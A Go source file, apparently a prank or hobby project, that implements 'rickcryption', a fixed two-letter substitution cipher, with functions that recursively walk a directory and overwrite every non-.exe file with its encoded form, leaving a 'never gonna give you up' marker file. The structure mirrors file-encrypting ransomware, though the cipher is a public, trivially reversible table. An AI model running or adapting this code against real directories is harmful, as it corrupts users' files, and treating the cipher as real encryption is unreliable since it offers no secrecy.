package rc

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

var cipher string = "le rr nj nk so et nh nt lr du wa lh ea kn bt oh ro dr rn eo uu d' ut nl ae 'y ec rt hs ns no am bh on is dt os rh oo gw st i' lc ta wo aw in dy oe fo wu of gr dw rc uo dh js ml kd oy gn yc th ry er og fk en mt tu yo go mr te rw fa lg wn el sm 'u gl pn ni ah an it mk iy lb se ne ou de ib 'n hl ei au or ct ok lf to da rg nr eh pr ee sr kt vm mo ue ls ce ef eu co gs md ld 's at wt 'o aa gm rf me eg la em wm 't 'l bo hf od hm ot y' sw nm tg iu sa tt hc ve uh io ie do tm gt fe ga rl mm yt mf tf re l' nn ho rd hn ti ar 'g sh nb af ru ts wi bd dn mg pt hd tn ng 'i e' he ha ew il ai sl yn ht ww ol es rb om br ed nd un we ul ii as oa ty sg gc hb 'e wh ny sv vl wf ll ui yh sn ek ir tr ye ud na um kl si al mu cn cr yr ws nc kg tw lk ay ra tk ih id lp ms su kw if hg yd"

// Cypher is the rickcryption cipher
func Cypher() (map[byte][]byte, map[string]byte) {

	chars := strings.Split(cipher, " ")
	// fmt.Println(strings.Join(chars, ""))

	var c1 = make(map[byte][]byte)
	var c2 = make(map[string]byte)
	for i := 0; i < 256; i++ {
		c1[byte(i)] = []byte(chars[i])
		c2[chars[i]] = byte(i)
	}
	return c1, c2
}

// BytesToFile creates a file from byte slice
func BytesToFile(filename string, data []byte) {
	f, err := os.Create(filename)
	if err != nil {
		fmt.Println(err)
		return
	}
	_, err = f.Write(data)
	if err != nil {
		fmt.Println(err)
		f.Close()
		return
	}
	// fmt.Println(l, "bytes written successfully")
	err = f.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
}

// Rickcrypt encrypts data using Cypher
func Rickcrypt(filename string) []byte {
	c1, _ := Cypher()
	f, err := os.Open(filename)
	if err != nil {
		log.Fatal(err)
	}
	defer func() {
		if err = f.Close(); err != nil {
			log.Fatal(err)
		}
	}()
	r := bufio.NewReader(f)
	b := make([]byte, 1)
	var in, out []byte
	for {
		n, err := r.Read(b)
		if err != nil {
			if err.Error() != "EOF" {
				fmt.Println("Error reading file:", err)
			}
			break
		}
		// fmt.Println(string(b[0:n]), " ", b[0:n][0], " ", b[0:n][0] == 32, " ", c1[b[0:n][0]], " ", string(c1[b[0:n][0]]))
		in = append(in, b[0:n][0])
		out = append(out, c1[b[0:n][0]][0])
		out = append(out, c1[b[0:n][0]][1])
	}

	// fmt.Println("\nrickcryption status")
	// fmt.Println("input: ", string(in))
	// fmt.Println("output:", string(out))
	return out
}

// Derick decrypts the rick cipher
func Derick(filename string) []byte {
	_, c2 := Cypher()
	f, err := os.Open(filename)
	if err != nil {
		log.Fatal(err)
	}
	defer func() {
		if err = f.Close(); err != nil {
			log.Fatal(err)
		}
	}()
	r := bufio.NewReader(f)
	b := make([]byte, 2)
	var in, out []byte
	for {
		n, err := r.Read(b)
		if err != nil {
			if err.Error() != "EOF" {
				fmt.Println("Error reading file:", err)
			}
			break
		}
		slice := b[0:n]
		str := string(slice)
		// fmt.Println(string(b[0:n]), " ", b[0:n][0], " ", b[0:n][0] == 32, " ", c2[b[0:n][0]], " ", string(c2[b[0:n][0]]))
		in = append(in, b[0:n][0])
		out = append(out, c2[str])
	}

	// fmt.Println("\nrickcryption status")
	// fmt.Println("input: ", string(in))
	// fmt.Println("output:", string(out))
	return out
}

// EncryptDir encrypts a directory
func EncryptDir(dirname string) {
	files, err := ioutil.ReadDir(dirname)
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.Name() == "status.rick" {
			fmt.Println("[RICKCRYPT] Directory has already been encrypted")
			return
		}
	}

	BytesToFile("status.rick", []byte("never gonna give you up"))

	for _, f := range files {
		if f.IsDir() {
			fmt.Println("[DIR] starting recursion: ", f.Name())
			BytesToFile("status.rick", []byte("never gonna give you up"))
			os.Chdir(f.Name())
			EncryptDir("./")
			os.Chdir("..")
			fmt.Println("[DIR] finished recursion: ", f.Name())
		} else {
			fmt.Println("[RICKCRYPT] encrypting: ", f.Name())
			if strings.Split(f.Name(), ".")[len(strings.Split(f.Name(), "."))-1] != "exe" {
				out := Rickcrypt(f.Name())
				BytesToFile(f.Name(), out)
			}
		}
	}
}

// DecryptDir decrypts a directory
func DecryptDir(dirname string) {
	files, err := ioutil.ReadDir(dirname)
	if err != nil {
		log.Fatal(err)
	}
	encrypted := false
	for _, f := range files {
		if f.Name() == "status.rick" {
			encrypted = true
		}
	}

	if !encrypted {
		fmt.Println("[RICKCRYPT] Directory has not been encrypted")
		return
	}
	os.Remove("status.rick")

	files, err = ioutil.ReadDir(dirname)
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if f.IsDir() {
			fmt.Println("[DIR] starting recursion: ", f.Name())
			os.Chdir(f.Name())
			DecryptDir("./")
			os.Chdir("..")
			fmt.Println("[DIR] finished recursion: ", f.Name())
		} else {
			fmt.Println("[RICKCRYPT] decrypting: ", f.Name())
			if strings.Split(f.Name(), ".")[len(strings.Split(f.Name(), "."))-1] != "exe" {
				out := Derick(f.Name())
				BytesToFile(f.Name(), out)
			}
		}
	}
}
